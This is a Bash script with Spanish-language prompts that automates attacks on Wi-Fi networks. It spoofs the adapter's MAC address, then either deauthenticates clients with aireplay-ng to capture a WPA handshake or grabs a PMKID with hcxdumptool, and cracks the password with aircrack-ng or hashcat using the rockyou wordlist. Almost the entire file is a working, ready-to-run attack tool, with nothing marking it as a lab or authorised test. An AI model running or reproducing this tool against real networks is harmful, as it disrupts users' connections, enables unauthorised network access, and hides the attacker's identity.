#!/usr/bin/env bash

# Autor: Daniel Benjamin Perez Morales
# GitHub: https://github.com/DanielPerezMoralesDev13
# Correo electrónico: danielperezdev@proton.me

export DEBIAN_FRONTEND=noninteractive

# Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

trap ctrl_c INT

function ctrl_c() {

  echo -e "\n ${yellowColour} [!] Saliendo... ${endColour}"

  tput cnorm

  [ -n "${networkCard}" ] && airmon-ng stop ${networkCard}mon >/dev/null 2>&1

  rm -f Captura* >/dev/null 2>&1
  exit 1
}

function helpPanel() {
  echo -e "${yellowColour} [*] ${endColour} ${grayColour} \r Uso: $0 ${endColour}"
  echo -e "\t ${purpleColour} a) ${endColour} ${yellowColour} Modo De Ataque ${endColour}"
  echo -e "\t\t ${redColour} - Handshake ${endColour}"
  echo -e "\t\t ${redColour} - PKMID ${endColour}"

  echo -e "\t ${purpleColour} n) ${endColour} ${yellowColour} Nombre De La Tarjeta De Red ${endColour}"
  echo -e "\t ${purpleColour} h) ${endColour} ${yellowColour} Panel De Ayuda ${endColour} \n"
  exit 0
}

function startAttack() {
  clear -T $TERM
  echo -e "\n ${yellowColour} [*] ${endColour} ${grayColour} Configurando Tarjeta De Red... ${endColour}"

  airmon-ng start ${networkCard} >/dev/null 2>&1
  ifconfig ${networkCard}mon down && macchanger -a ${networkCard}mon >/dev/null 2>&1
  ifconfig ${networkCard}mon up
  killall dhclient wpa_supplicant 2>/dev/null
  echo -e "\n ${yellowColour} [*] ${endColour} ${grayColour} Nueva Direccion MAC Asignada ${endColour} ${purpleColour} [ ${endColour} ${blueColour} $(macchanger -s ${networkCard}mon | grep -iw 'Current' --color=always | xargs | cut -d ' ' -f '3-100') ${endColour} ${purpleColour} ] ${endColour}"

  case "$attackMode" in
  "Handshake")
    xterm -hold -e "airodump-ng ${networkCard}mon" &

    xtermPID=$!
    echo -ne "\n ${yellowColour} [*] ${endColour} ${grayColour} Nombre Del Punto De Acceso: ${endColour}" && read apName
    echo -ne "\n ${yellowColour} [*] ${endColour} ${grayColour} Canal Del Punto De Acceso: ${endColour}" && read apChannel

    kill -9 $xtermPID

    wait $xtermPID 2>/dev/null

    xterm -hold -e "airodump-ng -c $apChannel -w Captura --essid $apName ${networkCard}mon" &

    xtermFilterPID=$!

    sleep 5
    # -0 0 Es Infinito
    xterm -hold -e "aireplay-ng -0 10 -e $apName -c FF:FF:FF:FF:FF:FF ${networkCard}mon" &

    aireplayXtermPID=$!

    sleep 5

    kill -9 $aireplayXtermPID

    wait $aireplayXtermPID 2>/dev/null

    sleep 10

    kill -9 $xtermFilterPID

    wait $xtermFilterPID 2>/dev/null

    xterm -hold -e "aircrack-ng -w ./rockyou.txt ./Captura-01.cap" &
    ;;
  "PKMID")
    clear
    echo -e "${yellowColour}[*]${endColour}${grayColour} Iniciando ClientLess PKMID Attack...${endColour}\n"
    sleep 2
    timeout 60 bash -c "hcxdumptool -i ${networkCard}mon --tot=1 --nmea_out=Captura"
    echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Obteniendo Hashes...${endColour}\n"
    sleep 2
    hcxpcaptool -z myHashes Captura >/dev/null 2>/dev/null
    if [ $(echo $?) -ne 0 ]; then
      echo -e "${redColour} [x] No Tienes Instalada La Herramienta hcxpcaptool... ${endColour}"
      exit 1
    fi

    rm -f Captura 2>/dev/null

    test -f myHashes

    if [ "$(echo $?)" == "0" ]; then
      echo -e "\n ${yellowColour} [*] ${endColour} ${grayColour} Iniciando Proceso De Fuerza Bruta... ${endColour} \n"
      sleep 2

      hashcat -m 16800 ./rockyou.txt myHashes -d 1 --force
    else
      echo -e "\n ${redColour} [!] ${endColour} ${grayColour} No Se Ha Podido Capturar El Paquete Necesario... ${endColour} \n"
      rm -f Captura* 2>/dev/null
      sleep 2
    fi
    ;;
  *)
    echo -e "\n ${redColour} [x] Modo De Ataque No Valido ${endColour} \n"
    ;;
  esac

}

function dependencies() {
  clear -T $TERM
  # Haciendo Invisible El Cursor
  tput civis
  echo -e "${yellowColour} [*] ${endColour} ${grayColour} Comprobando La Existencia De Programas Necesarios... ${endColour}"

  listDependencies=(aircrack-ng macchanger hcxdumptool hashcat)
  sleep 2

  for i in "${listDependencies[@]}"; do

    which "$i" &>/dev/null

    codeEstado=$(echo $?)

    echo -ne "\n ${yellowColour} [*] ${endColour} ${blueColour} Herramienta ${endColour} ${purpleColour} ${i} ${endColour} ${blueColour} ... ${endColour}"

    if [ ${codeEstado} -eq 0 ]; then
      echo -e "${greenColour} (Instalada) ${endColour}"
    else
      echo -e "${redColour} (No Instalada) ${endColour}"

      echo -e "\n ${yellowColour} [*] ${endColour} ${grayColour} Instalando Herramienta ${endColour} ${blueColour} ${i} ${endColour} ${yellowColour}...${endColour}"
      apt-get install $i -y &>/dev/null
    fi
    sleep 1
  done

  unset listDependencies codeEstado
}

if [ $(id -u) -eq 0 ]; then
  # a: Modo de ataque
  # n: Network Card -> Nombre de la tarjeta de red
  # h: Panel de ayuda

  declare -i parameterCounter=0

  while getopts ":a:n:h" args; do
    case $args in
    a)
      attackMode="$OPTARG"
      ((parameterCounter += 1))
      ;;
    n)
      networkCard="$OPTARG"
      ((parameterCounter += 1))
      ;;
    h)
      helpPanel
      ;;
    *)
      echo -e "\n ${redColour} [!] Opcion No Valida ${endColour} \n"
      helpPanel
      ;;
    esac
  done

  # Validación fuera del bucle
  if [ ${parameterCounter} -ne 2 ]; then
    echo -e "\n ${redColour} [!] Número de parámetros insuficientes: ${parameterCounter} ${endColour} \n"
    helpPanel
    exit 1
  else
    dependencies
    tput cnorm
    startAttack
    airmon-ng stop ${networkCard}mon >/dev/null 2>&1
    rm -f Captura* >/dev/null 2>&1

  fi

else
  echo -e "\n ${redColour} [!] No eres root...${endColour} \n"
  exit 1
fi

exit 0
